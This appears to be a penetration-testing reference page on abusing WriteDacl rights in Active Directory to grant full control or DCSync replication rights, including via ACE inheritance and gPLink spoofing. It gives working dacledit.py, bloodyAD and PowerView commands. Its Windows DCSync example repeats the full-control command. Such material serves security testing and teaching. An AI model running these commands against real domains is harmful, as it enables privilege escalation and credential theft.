This abuse can be carried out when controlling an object that has `WriteDacl` over another object.

The attacker can write a new ACE to the target object’s DACL (Discretionary Access Control List). This can give the attacker full control of the target object.

Instead of giving full control, the same process can be applied to allow an object to DCSync by adding two ACEs with specific Extended Rights (`DS-Replication-Get-Changes and DS-Replication-Get-Changes-All`). Giving full control leads to the same thing since `GenericAll` includes all `ExtendedRights`, hence the two extended rights needed for DCSync to work.
!!! note
    **ACE inheritance**
    If attacker can write an ACE (WriteDacl) for a container or organisational unit (OU), if inheritance flags are added (0x01+ 0x02) to the ACE, and inheritance is enabled for an object in that container/OU, the ACE will be applied to it. By default, all the objects with AdminCount=0 will inherit ACEs from their parent container/OU.

    Impacket's dacledit (Python) can be used with the -inheritance flag for that purpose

    **adminCount=1 (gPLink spoofing)**  

    In April 2024, Synacktiv explained that if `GenericAll`, `GenericWrite` or `Manage Group Policy Links` privileges are available against an Organisational Unit (OU), then it's possible to compromise its child users and computers with `adminCount=1` through "gPLink spoofing".

    This can be performed with [OUned.py](https://github.com/synacktiv/OUned).
=== "UNIX-like"
    From UNIX-like systems, this can be done with Impacket's dacledit.py (Python).
    ```bash
    # Give full control
    dacledit.py -action 'write' -rights 'FullControl' -principal 'controlled_object' -target 'target_object' "$DOMAIN"/"$USER":"$PASSWORD"

    # Give DCSync (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)
    dacledit.py -action 'write' -rights 'DCSync' -principal 'controlled_object' -target 'target_object' "$DOMAIN"/"$USER":"$PASSWORD"
    ```
    To enable inheritance, the -inheritance switch can be added to the command. Then it is possible to find interesting targets with AdminCount=0in BloodHound for example, by looking at the object attributes.
    ```bash
    # Give full control on the Users container with inheritance to the child object
    dacledit.py -action 'write' -rights 'FullControl' -principal 'controlled_object' -target-dn 'CN=Users,DC=domain,DC=local' -inheritance "$DOMAIN"/"$USER":"$PASSWORD"
    ```
    Alternatively, it can be achieved using bloodyAD
    ```bash
    # Give DCSync (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)
    bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add dcsync "$ControlledPrincipal"
    ```
=== "Windows"
    From a Windows system, this can be achieved with Add-DomainObjectAcl (PowerView module).
    ```bash
    # Give full control
    Add-DomainObjectAcl -Rights 'All' -TargetIdentity "target_object" -PrincipalIdentity "controlled_object"

    # Give DCSync (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)
    Add-DomainObjectAcl -Rights 'All' -TargetIdentity "target_object" -PrincipalIdentity "controlled_object"
    ```